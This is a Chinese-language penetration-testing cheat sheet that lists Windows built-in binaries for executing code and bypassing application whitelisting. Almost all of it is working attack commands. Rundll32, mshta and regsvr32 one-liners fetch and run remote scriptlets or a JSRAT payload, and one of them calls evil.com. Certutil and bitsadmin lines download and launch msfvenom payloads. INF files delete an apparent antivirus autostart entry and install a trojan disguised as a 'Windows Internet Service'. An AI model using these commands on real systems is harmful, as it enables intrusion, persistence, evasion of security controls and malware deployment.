windows script example in penetration
----

#### 1.	powershell ####

	powershell -executionpolicy bypass ./powershell_script.ps1

#### 2. VBS ####

默认可以直接在机器上运行，命令行下可以通过`cscript.exe`执行

	cscript.exe vbs_script.vbs
	vbs_script.vbs


#### 3. csc(.cs c#) ####

首先通过`csc.exe`进行编译c#为`exe`，然后通过`InstallUtil.exe`进行程序执行

	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:PEL.exe InstallUtilBypass.cs

	InstallUtil.exe /logfile= /LogToConsole=false /U PEL.exe

#### 4. Jscript(.js) ####

可以通过`wscript.exe`、`cscript.exe`以及直接运行，主要通过`ActiveXObject()`创建对应的对象`WScript.shell`、`Shell.Application`.

	cscript.exe/wscript.exe jscript.js
	jscript.js

JScript参考链接：http://www.yuanma.net/Manual/JavaScript/

https://evi1cg.me/archives/Run_JSRAT.html

https://github.com/Ridter/MyJSRat

通过访问wtf来获取payload, 最后是通过rundll32来执行的payload，不需要使用powershell

#### 5. Mshta ####

HTA（HTML Application)，可以嵌入`JScript`和`VBScript`，后缀名为`.hta`时可以直接运行，使用命令行`mshta`时，后缀可以使用`htm`,`xml`. 执行时带上绝对路径方可运行，否则无效。

	mshta vbscript:Close(Execute("GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct"").Exec()"))

	mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct").Exec();close();

#### 6. Rundll32 ####

利用时需要注意`RunHTMLApplication`后面是有一个空格。

	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}%  #JSRAT

	rundll32 AllTheThings.dll,EntryPoint 

	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct");o.Exec();window.close();	

通过`system`的一些`dll`可以扩展很多绕过方法：

	rundll32 url.dll, OpenURL file://c:\windows\system32\calc.exe

	rundll32 url.dll, OpenURLA file://c:\windows\system32\calc.exe

	rundll32 url.dll, FileProtocolHandler calc.exe
	
	rundll32 C:\Windows\system32\shell32.dll,OpenAs_RunDLL C:\ProgramData\x64.1

修改注册表项

reg.inf

    [Version]
    
    Signature="$WINDOWS NT$"
    
    [DefaultInstall]
    
    AddReg=My_AddReg_Name
    
    DelReg=My_DelReg_Name
    
    [My_DelReg_Name]
    
    HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,KAVRun

    rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/reg.inf

添加服务

srv.inf

    [Version]
    Signature="$WINDOWS NT$"
    [DefaultInstall.Services]
    AddService=inetsvr,,My_AddService_Name
    [My_AddService_Name]
    DisplayName=Windows Internet Service
    Description=提供对 Internet 信息服务管理的支持。
    ServiceType=0x10
    StartType=2
    ErrorControl=0
    ServiceBinary=%11%\muma.exe

	rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/srv.inf

https://github.com/redcanaryco/atomic-red-team/tree/master/Windows/Payloads/AllTheThings

#### 7. Regsvcs/Regasm

白名单绕过方法，通过加载DLL(.Net/C#).	(尝试在即编写dll，一直失败）, `regsvcs`注册`dll`需要签名。

	x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll

	x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll


	x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll

	x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll

https://github.com/redcanaryco/atomic-red-team/tree/master/Windows/Payloads/AllTheThings

https://gist.githubusercontent.com/jbarcia/a5ba8cf3badebf3c802f83832eda1059/raw/39aa6341cda40500a02cfc069b6d6ec45f1c5028/evil.cs(在编译这个脚本时，需要更改系统语言区域为英语/美国，非unicode，编译就不会报错了)

	rundll32 evil.dll,EntryPoint

http://www.codesec.net/view/443056.html

#### 8. Regsvr32

本地脚本加载运行

	regsvr32.exe /s /u /i:payload.sct scrobj.dll

远程脚本加载运行

	regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll

	regsvr32.exe  payload.dll	# DLLregisterServer
	regsvr32.exe  /u payload.dll # DLLUnregisterServer

#### 9. odbcconf/Msbuild

	odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}

	cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"

windows 文件下载

	certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe 1.exe
	certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe delete

#### 10.bitsadmin

	cmd.exe /c bitsadmin /transfer d90f http://vps/a %APPDATA%d90f.exe&%APPDATA%d90f.exe&del %APPDATA%d90f.exe

http://vps/a 为通过msfvenom生成payload


#### MISC

install metasploit：

	curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
